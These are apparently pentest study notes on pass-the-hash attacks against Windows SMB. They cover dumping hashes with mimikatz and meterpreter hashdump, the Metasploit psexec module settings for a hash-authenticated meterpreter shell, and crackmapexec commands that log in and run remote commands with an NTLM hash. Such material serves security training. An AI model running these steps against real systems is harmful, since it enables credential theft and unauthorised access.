
+ Pass-the-hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately via SMB.

+ We can use multiple tools to facilitate a Pass-The-Hash attack:
	+ Metasploit PsExec module
	+ Crackmapexec

+ This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining access via service exploitation.

### Prerequisites

1. Gain initial access.
2. Migrate to `lsass` to gain NT AUTHORITY/SYSTEM.
3. Use `mimikatz` to get the hashes of the users.
4. Take a note of the hashes, especially the Administrator account NTLM hash.

### How to perform this attack with `PsExec` ?

1. To perform pass the hash with `PsExec` we'll require both NTLM and LM hashes.
2. We can use the NTLM has we noted down earlier.
3. To obtain the LM hash, we can use `hashdump` in `meterpreter`.
	+ The format of hashes in `hashdump` output  is always-
	    `<USER>:<S-ID>:<LM-HASH>:<NTLM-HASH>:::`
1. Put the current `meterpreter` session in background.
2. Use the `PsExec` module. `use exploit/windows/smb/psexec`
3. Change the `LPORT`, as the background process is using the default port 4444.
4. Set the `SMBUser`.
5. Set the `SMBPass` to the hashes, in the format - `<LM-HASH>:<NTLM-HASH>`
6. Set a target - `set target Native\ upload`
7. Run the exploit. This will provide us with a `meterpreter` shell. 

*Since now we have both the LM & NTLM hashes, we can access the target anytime without exploiting a service, which makes this technique very useful.*

### Using `crackmapexec` 

```
crackmapexec smb <target-ip> -u <username> -H "<NTLM-HASH>"
```

- This will authenticate with the target.

__We can also run commands with it:__
```
crackmapexec smb <target-ip> -u <username> -H "<NTLM-HASH>" -x "ipconfig"
```